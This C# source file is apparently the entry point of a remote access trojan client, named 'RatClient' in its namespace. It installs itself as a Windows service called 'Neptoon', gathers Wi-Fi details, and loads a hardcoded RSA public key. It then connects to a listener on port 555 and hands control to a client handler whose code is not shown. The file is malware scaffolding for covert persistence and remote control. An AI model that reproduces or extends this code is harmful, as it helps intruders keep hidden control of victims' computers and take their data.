using System;
using System.Linq;
using System.Numerics;
using System.ServiceProcess;
using RatClient.Mtool;


namespace RatClient 
{

	public static class Program
	{
		#region Nested classes to support running as service

		public const string ServiceName = "Neptoon";

		public class Service : ServiceBase
		{
			public Service()
			{
				ServiceName = Program.ServiceName;
			}

			protected override void OnStart(string[] args)
			{
				Program.Start(args);
			}

			protected override void OnStop()
			{
				Program.Stop();
			}
		}
		#endregion

		static void Main(string[] args)
		{
			if (!Environment.UserInteractive)
				using (var service = new Service())
					ServiceBase.Run(service);
			else
			{
				Start(args);
				Stop();
			}
		}

		private static void Start(string[] args)
		{
			WifiInfo wifiInfo = new WifiInfo();
			Console.WriteLine(wifiInfo.GetJsonInfo());
			// return;
			Assertions setup = new Assertions(args);
			setup.AssertAll();
			Console.WriteLine(string.Join(", ", args));
			BigInteger n = BigInteger.Parse("130207301034004661455027913688923327146343398866625243908655292016961311687455936189602612639881746041437642117397999433889984747790829683399942449818446067929003127144782759564471484412125307160062468145732861525984991405836950669766085891756502788398772584383449300023796025235227753602387780436256335801097");
			BigInteger e = BigInteger.Parse("65537");
			BigInteger[] publicKey = new BigInteger[] { e, n };
			string ipAddress = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName())
				.AddressList.FirstOrDefault(ip => ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)?.ToString();
			Console.WriteLine(ipAddress);
			var client = new RatClient.Client(ipAddress, 555, publicKey);
			client.Handle();
		}

		private static void Stop()
		{
			
		}
	}
}
